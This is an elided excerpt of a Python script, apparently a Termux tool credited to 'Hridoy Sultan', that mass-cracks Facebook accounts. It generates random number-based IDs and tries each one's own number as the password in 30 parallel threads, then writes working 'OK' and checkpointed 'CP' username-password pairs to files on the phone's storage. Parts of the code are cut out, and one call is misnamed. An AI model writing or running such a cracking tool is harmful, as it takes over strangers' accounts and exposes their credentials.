...
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛HridSultan 🙂💗 \x07')

try:os.mkdir('/sdcard/sultan')
except:pass
...
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Hridoy Sultan
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://facebook.com/Hridoy Sultan
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/HridSultan
...
def menu():
    ...
    linex()
    sultan = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if sultan in ['1','01']:
        random_number()
    elif sultan in ['2','02']:
    	...
    	os.system("xdg-open https://www.facebook.com/sultan");time.sleep(3);menu()
    else:
...
def random_number():
    ...
    for _ in range(limit):
        ...
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as Sultan:
        clear()
        ...
        for sultan in idz:
            uid = code+sultan
            pww = [sultan,uid] 
            sultan.submit(crack, uid, pww, total_idz)
    linex()
...
def crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r{x}[sultan] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            ...
            if "session_key" in po:
                print(f"\r\033[1;92m [sultan-OK] {uid} | {pw}")
                open("/sdcard/sultan/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in po["error"]["message"]:
                cpclr = random.choice(["\033[1;90m","\033[1;91m","\x1b[38;5;205m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
                print(f"\r{cpclr} [sultan-CP] {uid} | {pw}")
                open("/sdcard/sultan/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid)
                break
            else:
                continue
